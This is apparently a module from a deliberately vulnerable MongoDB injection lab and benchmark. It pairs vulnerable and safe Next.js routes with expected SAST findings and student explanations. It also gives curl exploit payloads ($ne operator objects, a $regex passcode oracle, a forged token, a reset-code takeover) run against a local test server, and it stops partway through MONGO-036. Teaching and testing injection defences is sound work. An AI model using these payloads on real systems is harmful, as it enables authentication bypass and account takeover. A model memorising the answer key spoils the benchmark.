# Module: Workshop sign-in, codes and badges (second MongoDB batch)

The sign-in, one-time-code and badge routes of [the workshop batch](workshop.md) (MONGO-028 to MONGO-038). Techniques demonstrated: operator objects passing presence and length checks, a Zod schema that does not constrain the field that matters, JSON in headers and cookies, loop-built filters, a blind `$regex` oracle on a secret, a `JSON.parse` reviver that builds a `RegExp`, guarded pairs where only one field is guarded, an unsigned token, a raw reset code, unescaped badge patterns, and partial coercion.

The routes use the native `mongodb` driver against [mongodb-memory-server](https://www.npmjs.com/package/mongodb-memory-server) (MongoDB 8.2.6, loopback, synthetic data). The full answer key, with the label of every route, is in [workshop.md](workshop.md). Scope: injection only. The claims about safe routes are scoped to the input of the paired attack.

## Contents

| Scenario | Agent ref | Student guide | Exploit lab | Vuln vs protected | Tests |
| --- | --- | --- | --- | --- | --- |
| [MONGO-028 · A length check without a type check on a one-time code](#mongo-028) | [expected finding](#mongo-028-agent) | [guide](#mongo-028-student) | [Burp · Postman · curl](#mongo-028-exploit) | [comparison](#mongo-028-safe) | [tests](#mongo-028-tests) |
| [MONGO-029 · A Zod schema that passes the second field through](#mongo-029) | [expected finding](#mongo-029-agent) | [guide](#mongo-029-student) | [Burp · Postman · curl](#mongo-029-exploit) | [comparison](#mongo-029-safe) | [tests](#mongo-029-tests) |
| [MONGO-030 · A JSON header parsed into the filter](#mongo-030) | [expected finding](#mongo-030-agent) | [guide](#mongo-030-student) | [Burp · Postman · curl](#mongo-030-exploit) | [comparison](#mongo-030-safe) | [tests](#mongo-030-tests) |
| [MONGO-031 · A loop-built filter without a type check](#mongo-031) | [expected finding](#mongo-031-agent) | [guide](#mongo-031-student) | [Burp · Postman · curl](#mongo-031-exploit) | [comparison](#mongo-031-safe) | [tests](#mongo-031-tests) |
| [MONGO-032 · A prefix probe built into $regex](#mongo-032) | [expected finding](#mongo-032-agent) | [guide](#mongo-032-student) | [Burp · Postman · curl](#mongo-032-exploit) | [comparison](#mongo-032-safe) | [tests](#mongo-032-tests) |
| [MONGO-033 · A JSON.parse reviver that builds a RegExp](#mongo-033) | [expected finding](#mongo-033-agent) | [guide](#mongo-033-student) | [Burp · Postman · curl](#mongo-033-exploit) | [comparison](#mongo-033-safe) | [tests](#mongo-033-tests) |
| [MONGO-034 · $eq on one field of a pair](#mongo-034) | [expected finding](#mongo-034-agent) | [guide](#mongo-034-student) | [Burp · Postman · curl](#mongo-034-exploit) | [comparison](#mongo-034-safe) | [tests](#mongo-034-tests) |
| [MONGO-035 · An unsigned token claims object in the filter](#mongo-035) | [expected finding](#mongo-035-agent) | [guide](#mongo-035-student) | [Burp · Postman · curl](#mongo-035-exploit) | [comparison](#mongo-035-safe) | [tests](#mongo-035-tests) |
| [MONGO-036 · A reset code taken as it arrives](#mongo-036) | [expected finding](#mongo-036-agent) | [guide](#mongo-036-student) | [Burp · Postman · curl](#mongo-036-exploit) | [comparison](#mongo-036-safe) | [tests](#mongo-036-tests) |
| [MONGO-037 · An unescaped badge pattern](#mongo-037) | [expected finding](#mongo-037-agent) | [guide](#mongo-037-student) | [Burp · Postman · curl](#mongo-037-exploit) | [comparison](#mongo-037-safe) | [tests](#mongo-037-tests) |
| [MONGO-038 · One field coerced, its pair raw](#mongo-038) | [expected finding](#mongo-038-agent) | [guide](#mongo-038-student) | [Burp · Postman · curl](#mongo-038-exploit) | [comparison](#mongo-038-safe) | [tests](#mongo-038-tests) |

## Safe cases and why they are tricky

| Safe source | Control for | Why it is safe | Wrong reasoning it catches |
| --- | --- | --- | --- |
| `pages/api/workshop/desk/checkin.js` | MONGO-028 | The `/^\d{6}$/` test returns before the query and an object fails it; only six-digit text reaches the filter. | Counting checks without reading what they compare. |
| `pages/api/workshop/desk/clock-in.js` | MONGO-029 | The strict schema strips every key it does not list and coerces the login; an object passcode fails the union. | Reporting Zod routes without reading the schema. |
| `pages/api/workshop/desk/begin.js` | MONGO-029, MONGO-038 | The array-join text conversion runs on every value; an object becomes `[object Object]`. | Reporting a helper call without reading the coercion at the call site. |
| `pages/api/workshop/desk/terminal.js` | MONGO-030 | The header is cut at every colon; JSON in it cannot keep an object. | Reporting a header that reaches a filter without reading the cut. |
| `pages/api/workshop/desk/unlock.js` | MONGO-031 | The operator is fixed and the value is an element of `$in`; the server refuses an operator object inside `$in` (measured on MongoDB 8.2.6). | Reporting every loop-built filter without reading the operator. |
| `pages/api/workshop/desk/verify.js` | MONGO-032 | The secret never reaches the query; the comparison is JavaScript `===`, where a pattern is only text. | Reporting a route because the request value names a secret. |
| `pages/api/workshop/desk/accept.js` | MONGO-033 | The reviver stringifies any object value at a named key, so a value is always a string. | Treating every `JSON.parse` reviver route as dangerous without reading the reviver. |
| `pages/api/workshop/desk/load.js` | MONGO-033 | The reviver returns `undefined` for every `$`-prefixed key at any level, so the operator object is removed. | Stopping at the first `JSON.parse` without reading the reviver. |
| `pages/api/workshop/desk/start.js` | MONGO-034 | Both request values are operands of fixed comparison operators, and an operand is compared literally. | Reporting any raw value inside `$and`/`$not`/`$eq` without reading which parts are the operators. |
| `pages/api/workshop/desk/permit.js` | MONGO-035 | `open` compares the seal with the process key before decoding, so a forged body never becomes claims. | Reporting a token that reaches a filter without reading which reader verifies it. |
| `pages/api/workshop/desk/refresh.js` | MONGO-036 | The one-time code is hashed before the query; any value becomes the digest text of its string form. | Reporting a secret-in-filter route without reading the transform before it. |
| `pages/api/workshop/desk/tap.js` | MONGO-037 | `literal()` escapes `\ ^ $ . * + ? ( ) [ ] { } \| / -`, the full set a pattern can use. | Judging by the presence of a template, not of an escape. |
| `pages/api/workshop/desk/wave.js` | MONGO-037 | Every non-word character becomes a one-member class `[\…]`, closed and literal under both the server's PCRE and a JavaScript reading. | Reporting every pattern built from user text without reading the transform. |

## Vulnerable cases that look safe

| Vulnerable source | What looks like a control | Why it is not |
| --- | --- | --- |
| `pages/api/workshop/desk/arrive.js` (MONGO-028) | A length check on the one-time code | The check measures the length of `String(otp)` and then passes the raw value to the query, so an object slips through as `[object Object]` on the way in and as an operator at the server. |
| `pages/api/workshop/desk/badge-in.js` (MONGO-029) | A Zod schema and a `refine` | `looseObject` passes unknown keys through and the refine only asks that `passcode` is truthy, so an operator object survives both. |
| `pages/api/workshop/desk/context.js` (MONGO-030) | Only two named fields are read | The header value is `JSON.parse`d first, so the "named fields" hold whatever object the caller sends. |
| `pages/api/workshop/desk/enter.js` (MONGO-031) | A loop that rejects missing fields | The loop checks presence, never type; every value it accepts goes into the filter as it arrived. |
| `pages/api/workshop/desk/hint.js` (MONGO-032) | A `typeof` check on `start` | The check pins the type but not the content; the text is interpolated into a `$regex` pattern on a secret field. |
| `pages/api/workshop/desk/import.js` (MONGO-033) | A reviver that handles objects | The reviver turns `/…/` text into a live `RegExp`, which is exactly the shape MongoDB evaluates as a pattern. |
| `pages/api/workshop/desk/open-up.js` (MONGO-034) | `$eq` and `String()` on the login | Only one field of the pair is guarded; the raw `passcode` decides the match. |
| `pages/api/workshop/desk/pass.js` (MONGO-035) | A signed-looking token format | `decode` reads the body without checking the seal, so the claims are caller JSON. |
| `pages/api/workshop/desk/renew.js` (MONGO-036) | A required code and a password rule | The code is only checked for truthiness, and the row it matches is then updated with the caller's password. |
| `pages/api/workshop/desk/scan.js` (MONGO-037) | A `typeof` and length check on the badge | The badge must be a string of two or more characters — which `.*` is. |
| `pages/api/workshop/desk/shift.js` (MONGO-038) | A template string on the login | `` `${login}` `` coerces one field while its pair keeps its object shape in the filter. |

---

<a id="mongo-028"></a>
## MONGO-028 · A length check without a type check on a one-time code

<a id="mongo-028-agent"></a>
### Agent reference — expected finding

| Field | Value |
| --- | --- |
| Source | `pages/api/workshop/desk/arrive.js` |
| Safe control | `pages/api/workshop/desk/checkin.js` |
| Route | `POST /api/workshop/desk/arrive` vs `/api/workshop/desk/checkin` |
| Flow | body `otp` → length check on `String(otp)` → `findOne` filter → operator comparison |
| Tests | `tests/unit/workshop-scenarios.test.mjs`, `tests/api/lab.api.test.mjs` |

**Expected finding:** SAST reports CWE-943 in the vulnerable source and nothing in the safe source.

[Student guide](#mongo-028-student) · [Exploit lab](#mongo-028-exploit) · [Vuln vs protected](#mongo-028-safe) · [Tests](#mongo-028-tests)

<a id="mongo-028-student"></a>
### Student guide

The route checks that the one-time code is long enough by measuring `String(otp)` — the *string form* of the value — and then passes `otp` itself to the query. An object value sails through the check (its string form is long) and arrives in the filter, where MongoDB reads `{"$ne":"x"}` as an operator: "the one-time code is not x", which is true for every seeded row. A check that measures one form of a value and then uses another form is not a type check.

<a id="mongo-028-exploit"></a>
### Exploit lab

Run `curl -s -X POST http://127.0.0.1:3000/api/lab/reset` first. Send the same input to both routes.

**Burp Suite**: send the requests below to Repeater (Copy as curl command, then paste) and compare the response bodies.

**Postman**: import each curl command below and compare the response bodies.

**curl**

```bash
curl -s -X POST http://127.0.0.1:3000/api/workshop/desk/arrive -H 'Content-Type: application/json' \
  -d '{"otp":{"$ne":"x"}}'
# person: admin — no code was sent

curl -s -X POST http://127.0.0.1:3000/api/workshop/desk/checkin -H 'Content-Type: application/json' \
  -d '{"otp":{"$ne":"x"}}'
# status 400; no person
```

**Observation that proves exploitation:** the response holds `person` `admin` (the role admin) although no one-time code was sent.

<a id="mongo-028-safe"></a>
### Vulnerable vs protected — and why

| Route | Side | Why |
| --- | --- | --- |
| `pages/api/workshop/desk/arrive.js` | vulnerable | The check measures the length of the string form, never the type; an object passes it and MongoDB reads it as an operator. |
| `pages/api/workshop/desk/checkin.js` | protected | The format test returns before the query and an object fails it; only six-digit text reaches the filter. |

The control is scoped to this flaw.

<a id="mongo-028-tests"></a>
### Automated tests

- `tests/unit/workshop-scenarios.test.mjs`: the input succeeds on the vulnerable route and has no effect on the safe route; both accept ordinary input.
- `tests/api/lab.api.test.mjs`: the same over HTTP against the production build.

---

<a id="mongo-029"></a>
## MONGO-029 · A Zod schema that passes the second field through

<a id="mongo-029-agent"></a>
### Agent reference — expected finding

| Field | Value |
| --- | --- |
| Source | `pages/api/workshop/desk/badge-in.js` |
| Safe control | `pages/api/workshop/desk/clock-in.js` |
| Other safe cases | `pages/api/workshop/desk/begin.js` |
| Route | `POST /api/workshop/desk/badge-in` vs `/api/workshop/desk/clock-in` |
| Flow | body → Zod `looseObject` and `refine` → parsed data → `findOne` filter |
| Tests | `tests/unit/workshop-scenarios.test.mjs`, `tests/api/lab.api.test.mjs` |

**Expected finding:** SAST reports CWE-943 in the vulnerable source and nothing in the safe sources.

[Student guide](#mongo-029-student) · [Exploit lab](#mongo-029-exploit) · [Vuln vs protected](#mongo-029-safe) · [Tests](#mongo-029-tests)

<a id="mongo-029-student"></a>
### Student guide

A Zod schema is a list of promises about each field. This one pins `login` to a non-empty string, but `passcode` is left to `.refine((entry) => entry.passcode)` — a predicate that only asks the value is there. Because the schema is a `looseObject`, unknown keys survive too, and the *parsed* object goes to the filter unchanged. The strict twin strips what it does not list; the coercion twin turns every value into text. A schema only guards the fields it actually constrains.

<a id="mongo-029-exploit"></a>
### Exploit lab

Run `curl -s -X POST http://127.0.0.1:3000/api/lab/reset` first. Send the same input to all three routes.

**Burp Suite**: send the requests below to Repeater (Copy as curl command, then paste) and compare the response bodies.

**Postman**: import each curl command below and compare the response bodies.

**curl**

```bash
curl -s -X POST http://127.0.0.1:3000/api/workshop/desk/badge-in -H 'Content-Type: application/json' \
  -d '{"login":"admin","passcode":{"$ne":""}}'
# person: admin

curl -s -X POST http://127.0.0.1:3000/api/workshop/desk/clock-in -H 'Content-Type: application/json' \
  -d '{"login":"admin","passcode":{"$ne":""}}'
# status 400

curl -s -X POST http://127.0.0.1:3000/api/workshop/desk/begin -H 'Content-Type: application/json' \
  -d '{"login":"admin","passcode":{"$ne":""}}'
# person: null
```

**Observation that proves exploitation:** the loose-schema route answers with `person` `admin`; the strict schema rejects the same body, and the coercion route turns it into text that matches nothing.

<a id="mongo-029-safe"></a>
### Vulnerable vs protected — and why

| Route | Side | Why |
| --- | --- | --- |
| `pages/api/workshop/desk/badge-in.js` | vulnerable | The schema pins `login` but leaves `passcode` to a refine that only asks it is truthy; the parsed object goes to the filter as it is. |
| `pages/api/workshop/desk/clock-in.js` | protected | The strict schema strips every key it does not list and coerces the login; an object passcode fails the union. |
| `pages/api/workshop/desk/begin.js` | protected | The array-join text conversion runs on every value; an object becomes `[object Object]`. |

The control is scoped to this flaw.

<a id="mongo-029-tests"></a>
### Automated tests

- `tests/unit/workshop-scenarios.test.mjs`: the input succeeds on the vulnerable route and has no effect on each safe route; every route accepts ordinary input.
- `tests/api/lab.api.test.mjs`: the same over HTTP against the production build.

---

<a id="mongo-030"></a>
## MONGO-030 · A JSON header parsed into the filter

<a id="mongo-030-agent"></a>
### Agent reference — expected finding

| Field | Value |
| --- | --- |
| Source | `pages/api/workshop/desk/context.js` |
| Safe control | `pages/api/workshop/desk/terminal.js` |
| Route | `GET /api/workshop/desk/context` vs `/api/workshop/desk/terminal` |
| Flow | `x-desk` header → `JSON.parse` → `login`/`badge` → `findOne` filter |
| Tests | `tests/unit/workshop-scenarios.test.mjs`, `tests/api/lab.api.test.mjs` |

**Expected finding:** SAST reports CWE-943 in the vulnerable source and nothing in the safe source.

[Student guide](#mongo-030-student) · [Exploit lab](#mongo-030-exploit) · [Vuln vs protected](#mongo-030-safe) · [Tests](#mongo-030-tests)

<a id="mongo-030-student"></a>
### Student guide

A request header is attacker-controlled text, exactly like a body. This route parses the whole `x-desk` header as JSON and reads two fields out of it — but `JSON.parse` can return objects *inside* those fields, and the filter receives them as they are. The twin splits the same header on `:` and gets plain strings, which cannot hold an operator.

<a id="mongo-030-exploit"></a>
### Exploit lab

Run `curl -s -X POST http://127.0.0.1:3000/api/lab/reset` first. Send the same header to both routes.

**Burp Suite**: send the requests below to Repeater (Copy as curl command, then paste) and compare the response bodies.

**Postman**: import each curl command below and compare the response bodies.

**curl**

```bash
curl -s http://127.0.0.1:3000/api/workshop/desk/context \
  -H 'x-desk: {"login":"admin","badge":{"$ne":""}}'
# person: admin

curl -s http://127.0.0.1:3000/api/workshop/desk/terminal \
  -H 'x-desk: {"login":"admin","badge":{"$ne":""}}'
# person: null
```

**Observation that proves exploitation:** the JSON-parsing route answers with `person` `admin`; the splitting route reads the same header as two broken strings and finds nobody.

<a id="mongo-030-safe"></a>
### Vulnerable vs protected — and why

| Route | Side | Why |
| --- | --- | --- |
| `pages/api/workshop/desk/context.js` | vulnerable | The whole header value is parsed as JSON, so nested objects reach the filter. |
| `pages/api/workshop/desk/terminal.js` | protected | The header becomes two plain strings; JSON in it is cut at every colon and cannot keep an object. |

The control is scoped to this flaw.

<a id="mongo-030-tests"></a>
### Automated tests

- `tests/unit/workshop-scenarios.test.mjs`: the input succeeds on the vulnerable route and has no effect on the safe route; both accept ordinary input.
- `tests/api/lab.api.test.mjs`: the same over HTTP against the production build.

---

<a id="mongo-031"></a>
## MONGO-031 · A loop-built filter without a type check

<a id="mongo-031-agent"></a>
### Agent reference — expected finding

| Field | Value |
| --- | --- |
| Source | `pages/api/workshop/desk/enter.js` |
| Safe control | `pages/api/workshop/desk/unlock.js` |
| Route | `POST /api/workshop/desk/enter` vs `/api/workshop/desk/unlock` |
| Flow | body values → loop over field names → bound `findOne` → operator comparison |
| Tests | `tests/unit/workshop-scenarios.test.mjs`, `tests/api/lab.api.test.mjs` |

**Expected finding:** SAST reports CWE-943 in the vulnerable source and nothing in the safe source.

[Student guide](#mongo-031-student) · [Exploit lab](#mongo-031-exploit) · [Vuln vs protected](#mongo-031-safe) · [Tests](#mongo-031-tests)

<a id="mongo-031-student"></a>
### Student guide

Building a filter in a loop is a common way to handle several optional fields. The trap is what the loop checks: this one rejects only `undefined` and `''`, so any truthy value — including an object — is stored raw in `wanted[field]`. The twin uses the same loop shape but wraps every value in a fixed `{$in: [value]}`; an operator object inside `$in` is refused by the server (measured on MongoDB 8.2.6), so the identical input dies as an error instead of matching.

<a id="mongo-031-exploit"></a>
### Exploit lab

Run `curl -s -X POST http://127.0.0.1:3000/api/lab/reset` first. Send the same input to both routes.

**Burp Suite**: send the requests below to Repeater (Copy as curl command, then paste) and compare the response bodies.

**Postman**: import each curl command below and compare the response bodies.

**curl**

```bash
curl -s -X POST http://127.0.0.1:3000/api/workshop/desk/enter -H 'Content-Type: application/json' \
  -d '{"login":"admin","passcode":{"$ne":""}}'
# person: admin

curl -s -X POST http://127.0.0.1:3000/api/workshop/desk/unlock -H 'Content-Type: application/json' \
  -d '{"login":"admin","passcode":{"$ne":""}}'
# refused (500); no person
```

**Observation that proves exploitation:** the plain loop answers with `person` `admin`; the `$in` twin refuses the operator object and returns no person.

<a id="mongo-031-safe"></a>
### Vulnerable vs protected — and why

| Route | Side | Why |
| --- | --- | --- |
| `pages/api/workshop/desk/enter.js` | vulnerable | The loop checks presence, never type; each value lands in the filter as it arrives. |
| `pages/api/workshop/desk/unlock.js` | protected | The operator is fixed and the value is an element of `$in`; the server refuses an operator object inside it. |

The control is scoped to this flaw.

<a id="mongo-031-tests"></a>
### Automated tests

- `tests/unit/workshop-scenarios.test.mjs`: the input succeeds on the vulnerable route and has no effect on the safe route; both accept ordinary input.
- `tests/api/lab.api.test.mjs`: the same over HTTP against the production build.

---

<a id="mongo-032"></a>
## MONGO-032 · A prefix probe built into $regex

<a id="mongo-032-agent"></a>
### Agent reference — expected finding

| Field | Value |
| --- | --- |
| Source | `pages/api/workshop/desk/hint.js` |
| Safe control | `pages/api/workshop/desk/verify.js` |
| Route | `POST /api/workshop/desk/hint` vs `/api/workshop/desk/verify` |
| Flow | body `start` (text) → template into `$regex` → `findOne` on a secret field |
| Tests | `tests/unit/workshop-scenarios.test.mjs`, `tests/api/lab.api.test.mjs` |

**Expected finding:** SAST reports CWE-943 in the vulnerable source and nothing in the safe source.

[Student guide](#mongo-032-student) · [Exploit lab](#mongo-032-exploit) · [Vuln vs protected](#mongo-032-safe) · [Tests](#mongo-032-tests)

<a id="mongo-032-student"></a>
### Student guide

The route answers one bit: "does this person's passcode start with this text?" — a password hint. The operator (`$regex`) is fixed, but the *pattern* is the caller's text interpolated without escaping, so `.*` asks "does it start with anything?" and the answer is yes. Send one character at a time and the same route reads the passcode out letter by letter (blind inference). The twin fetches the row with a fixed equality and compares the whole value in JavaScript, where a pattern is only text.

<a id="mongo-032-exploit"></a>
### Exploit lab

Run `curl -s -X POST http://127.0.0.1:3000/api/lab/reset` first. Send the same input to both routes.

**Burp Suite**: send the requests below to Repeater (Copy as curl command, then paste) and compare the response bodies.

**Postman**: import each curl command below and compare the response bodies.

**curl**

```bash
curl -s -X POST http://127.0.0.1:3000/api/workshop/desk/hint -H 'Content-Type: application/json' \
  -d '{"login":"admin","start":".*"}'
# {"right":true} — without any knowledge of the passcode

curl -s -X POST http://127.0.0.1:3000/api/workshop/desk/verify -H 'Content-Type: application/json' \
  -d '{"login":"admin","start":".*"}'
# {"right":false}
```

**Observation that proves exploitation:** the hint route says `right: true` for a pattern the caller invented; the JavaScript comparison says `false` for the same input.

<a id="mongo-032-safe"></a>
### Vulnerable vs protected — and why

| Route | Side | Why |
| --- | --- | --- |
| `pages/api/workshop/desk/hint.js` | vulnerable | `start` is checked for type, not for pattern characters; `^.*` matches any passcode and the boolean reply becomes a per-character oracle. |
| `pages/api/workshop/desk/verify.js` | protected | The secret never reaches the query; the comparison is `===`, and a pattern string is only text there. |

The control is scoped to this flaw.

<a id="mongo-032-tests"></a>
### Automated tests

- `tests/unit/workshop-scenarios.test.mjs`: the input succeeds on the vulnerable route and has no effect on the safe route; both accept ordinary input.
- `tests/api/lab.api.test.mjs`: the same over HTTP against the production build.

---

<a id="mongo-033"></a>
## MONGO-033 · A JSON.parse reviver that builds a RegExp

<a id="mongo-033-agent"></a>
### Agent reference — expected finding

| Field | Value |
| --- | --- |
| Source | `pages/api/workshop/desk/import.js` |
| Safe control | `pages/api/workshop/desk/accept.js` |
| Other safe cases | `pages/api/workshop/desk/load.js` |
| Route | `POST /api/workshop/desk/import` vs `/api/workshop/desk/accept` |
| Flow | body `payload` → `JSON.parse` reviver builds a `RegExp` → `findOne` filter |
| Tests | `tests/unit/workshop-scenarios.test.mjs`, `tests/api/lab.api.test.mjs` |

**Expected finding:** SAST reports CWE-943 in the vulnerable source and nothing in the safe sources.

[Student guide](#mongo-033-student) · [Exploit lab](#mongo-033-exploit) · [Vuln vs protected](#mongo-033-safe) · [Tests](#mongo-033-tests)

<a id="mongo-033-student"></a>
### Student guide

A `JSON.parse` reviver can return *anything* for each value — and what it returns becomes the value. This one converts text shaped like `/…/` into a live `RegExp`, which the driver serialises as a BSON regex: the server matches by pattern instead of by equality. A pattern matches many stored codes, so one crafted string pulls the admin row. The twins show the two safe revivers: stringify every object (nothing structured survives), and drop every `$`-key at every depth (operators vanish).

<a id="mongo-033-exploit"></a>
### Exploit lab

Run `curl -s -X POST http://127.0.0.1:3000/api/lab/reset` first. Send the same input to all three routes.

**Burp Suite**: send the requests below to Repeater (Copy as curl command, then paste) and compare the response bodies.

**Postman**: import each curl command below and compare the response bodies.

**curl**

```bash
curl -s -X POST http://127.0.0.1:3000/api/workshop/desk/import -H 'Content-Type: application/json' \
  -d '{"payload":"{\"login\":\"admin\",\"passcode\":\"/.*-only/\"}"}'
# person: admin

curl -s -X POST http://127.0.0.1:3000/api/workshop/desk/accept -H 'Content-Type: application/json' \
  -d '{"payload":"{\"login\":\"admin\",\"passcode\":\"/.*-only/\"}"}'
# person: null — the pattern stays text

curl -s -X POST http://127.0.0.1:3000/api/workshop/desk/load -H 'Content-Type: application/json' \
  -d '{"payload":"{\"login\":\"admin\",\"passcode\":\"/.*-only/\"}"}'
# person: null — the pattern stays text

# load's own reviver, shown with an operator object: every $-key is dropped.
curl -s -X POST http://127.0.0.1:3000/api/workshop/desk/load -H 'Content-Type: application/json' \
  -d '{"payload":"{\"login\":\"admin\",\"passcode\":{\"$ne\":\"\"}}"}'
# person: null — the operator is removed
```

**Observation that proves exploitation:** only the regex-building reviver produces `person` `admin`.

<a id="mongo-033-safe"></a>
### Vulnerable vs protected — and why

| Route | Side | Why |
| --- | --- | --- |
| `pages/api/workshop/desk/import.js` | vulnerable | The reviver turns `/…/` text into a live `RegExp` inside the filter; a pattern matches many stored codes. |
| `pages/api/workshop/desk/accept.js` | protected | The reviver stringifies any object value at a named key, so a value is always a string. |
| `pages/api/workshop/desk/load.js` | protected | The reviver returns `undefined` for every `$`-prefixed key at any level; `{}` remains, which equals no stored text. |

The control is scoped to this flaw.

<a id="mongo-033-tests"></a>
### Automated tests

- `tests/unit/workshop-scenarios.test.mjs`: the input succeeds on the vulnerable route and has no effect on each safe route; every route accepts ordinary input.
- `tests/api/lab.api.test.mjs`: the same over HTTP against the production build.

---

<a id="mongo-034"></a>
## MONGO-034 · $eq on one field of a pair

<a id="mongo-034-agent"></a>
### Agent reference — expected finding

| Field | Value |
| --- | --- |
| Source | `pages/api/workshop/desk/open-up.js` |
| Safe control | `pages/api/workshop/desk/start.js` |
| Route | `POST /api/workshop/desk/open-up` vs `/api/workshop/desk/start` |
| Flow | body `passcode` → `repository.one` → `findOne` filter; `$eq` guards only the login |
| Tests | `tests/unit/workshop-scenarios.test.mjs`, `tests/api/lab.api.test.mjs` |

**Expected finding:** SAST reports CWE-943 in the vulnerable source and nothing in the safe source.

[Student guide](#mongo-034-student) · [Exploit lab](#mongo-034-exploit) · [Vuln vs protected](#mongo-034-safe) · [Tests](#mongo-034-tests)

<a id="mongo-034-student"></a>
### Student guide

`$eq` with a coerced operand is a real control: the value is compared literally, so an operator object cannot survive it. This route applies that control to the *login* and then spreads the raw `passcode` beside it — guarding one field of a pair does not guard the pair. The twin is the mirror image: it looks scarier (`$and`, `$not`, `$ne`) but both request values are *operands* of fixed comparison operators, and an operand is always compared literally.

<a id="mongo-034-exploit"></a>
### Exploit lab

Run `curl -s -X POST http://127.0.0.1:3000/api/lab/reset` first. Send the same input to both routes.

**Burp Suite**: send the requests below to Repeater (Copy as curl command, then paste) and compare the response bodies.

**Postman**: import each curl command below and compare the response bodies.

**curl**

```bash
curl -s -X POST http://127.0.0.1:3000/api/workshop/desk/open-up -H 'Content-Type: application/json' \
  -d '{"login":"admin","passcode":{"$ne":""}}'
# person: admin

curl -s -X POST http://127.0.0.1:3000/api/workshop/desk/start -H 'Content-Type: application/json' \
  -d '{"login":"admin","passcode":{"$ne":""}}'
# person: null
```

**Observation that proves exploitation:** the guarded-login route still answers `person` `admin` through its unguarded pair; the operand-only route finds nobody.

<a id="mongo-034-safe"></a>
### Vulnerable vs protected — and why

| Route | Side | Why |
| --- | --- | --- |
| `pages/api/workshop/desk/open-up.js` | vulnerable | `$eq` and `String()` guard the login only; the passcode goes to the filter as it arrives. |
| `pages/api/workshop/desk/start.js` | protected | Both request values are operands of fixed comparison operators, compared literally. |

The control is scoped to this flaw.

<a id="mongo-034-tests"></a>
### Automated tests

- `tests/unit/workshop-scenarios.test.mjs`: the input succeeds on the vulnerable route and has no effect on the safe route; both accept ordinary input.
- `tests/api/lab.api.test.mjs`: the same over HTTP against the production build.

---

<a id="mongo-035"></a>
## MONGO-035 · An unsigned token claims object in the filter

<a id="mongo-035-agent"></a>
### Agent reference — expected finding

| Field | Value |
| --- | --- |
| Source | `pages/api/workshop/desk/pass.js` |
| Safe control | `pages/api/workshop/desk/permit.js` |
| Route | `GET /api/workshop/desk/pass` vs `/api/workshop/desk/permit` |
| Flow | `x-pass` header → `decode` without a seal check → `claims.sub` → `findOne` filter |
| Tests | `tests/unit/workshop-scenarios.test.mjs`, `tests/api/lab.api.test.mjs` |

**Expected finding:** SAST reports CWE-943 in the vulnerable source and nothing in the safe source.

[Student guide](#mongo-035-student) · [Exploit lab](#mongo-035-exploit) · [Vuln vs protected](#mongo-035-safe) · [Tests](#mongo-035-tests)

<a id="mongo-035-student"></a>
### Student guide

The token module offers two readers: `decode` (base64url and `JSON.parse`) and `open` (HMAC check first). This route uses `decode`, so the "claims" are whatever JSON the caller base64-encodes — including a `sub` that is an operator object. The filter key is fixed (`login`), but the *value* arrives structured. The twin verifies the seal with `timingSafeEqual` before decoding, so a forged body never becomes claims at all.

<a id="mongo-035-exploit"></a>
### Exploit lab

Run `curl -s -X POST http://127.0.0.1:3000/api/lab/reset` first. Send the same header to both routes. The token below is the base64url of `{"sub":{"$ne":""}}` followed by any seal.

**Burp Suite**: send the requests below to Repeater (Copy as curl command, then paste) and compare the response bodies.

**Postman**: import each curl command below and compare the response bodies.

**curl**

```bash
curl -s http://127.0.0.1:3000/api/workshop/desk/pass \
  -H 'x-pass: eyJzdWIiOnsiJG5lIjoiIn19.x'
# person: admin

curl -s http://127.0.0.1:3000/api/workshop/desk/permit \
  -H 'x-pass: eyJzdWIiOnsiJG5lIjoiIn19.x'
# status 401
```

**Observation that proves exploitation:** the unverified reader turns a forged body into `person` `admin`; the verifying reader rejects the same token.

<a id="mongo-035-safe"></a>
### Vulnerable vs protected — and why

| Route | Side | Why |
| --- | --- | --- |
| `pages/api/workshop/desk/pass.js` | vulnerable | `decode` reads the token body without checking the seal, so the claims are caller JSON; `claims.sub` as an object reaches the filter. |
| `pages/api/workshop/desk/permit.js` | protected | `open` compares the seal with the process key before decoding, so a forged body never becomes claims. |

The control is scoped to this flaw.

<a id="mongo-035-tests"></a>
### Automated tests

- `tests/unit/workshop-scenarios.test.mjs`: the input succeeds on the vulnerable route and has no effect on the safe route; both accept ordinary input.
- `tests/api/lab.api.test.mjs`: the same over HTTP against the production build.

---

<a id="mongo-036"></a>
## MONGO-036 · A reset code taken as it arrives

<a id="mongo-036-agent"></a>
### Agent reference — expected finding

| Field | Value |
| --- | --- |
| Source | `pages/api/workshop/desk/renew.js` |
| Safe control | `pages/api/workshop/desk/refresh.js` |
| Route | `POST /api/workshop/desk/renew` vs `/api/workshop/desk/renew`'s control `/api/workshop/desk/refresh` |
| Flow | body `code` (truthy check only) → `findOne` `resetCode` → `updateOne` `passcode` |
| Tests | `tests/unit/workshop-scenarios.test.mjs`, `tests/api/lab.api.test.mjs` |

**Expected finding:** SAST reports CWE-943 in the vulnerable source and nothing in the safe source.

[Student guide](#mongo-036-student) · [Exploit lab](#mongo-036-exploit) · [Vuln vs protected](#mongo-036-safe) · [Tests](#mongo-036-tests)

<a id="mongo-036-student"></a>
### Student guide

A reset-code lookup with no password is a one-factor door: whoever matches the code owns the row. This route only checks that `code` is truthy, so `{"$ne":""}` matches the first row that has any code, and the route then writes the caller's chosen password onto it. The twin hashes `String(code)` first — the digest of an object's string form matches nothing — so the identical input is only text.

<a id="mongo-036-exploit"></a>
### Exploit lab

Run `curl -s -X POST http://127.0.0.1:3000/api/lab/reset` first. Send the same input to both routes, then read the effect back.

**Burp Suite**: send the requests below to Repeater (Copy as curl command, then paste) and compare the response bodies.

**Postman**: import each curl command below and compare the response bodies.

**curl**

```bash
curl -s -X POST http://127.0.0.1:3000/api/workshop/desk/renew -H 'Content-Type: application/json' \
  -d '{"code":{"$ne":""},"next":"zazzles-marker-pass"}'
# person: admin

curl -s -X POST http://127.0.0.1:3000/api/workshop/desk/refresh -H 'Content-Type: application/json' \
  -d '{"code":{"$ne":""},"next":"zazzles-marker-pass"}'
# person: null

# Read the effect back: the admin passcode is now the marker.
curl -s -X POST http://127.0.0.1:3000/api/workshop/desk/accept -H 'Content-Type: application/json' \
  -d '{"payload":"{\"login\":\"admin\",\"passcode\":\"zazzles-marker-pass\"}"}'
# person: admin
```

**Observation that proves exploitation:** after the reset, the sign-in works with the marker password — written without ever knowing the reset code.

<a id="mongo-036-safe"></a>
### Vulnerable vs protected — and why

| Route | Side | Why |
| --- | --- | --- |
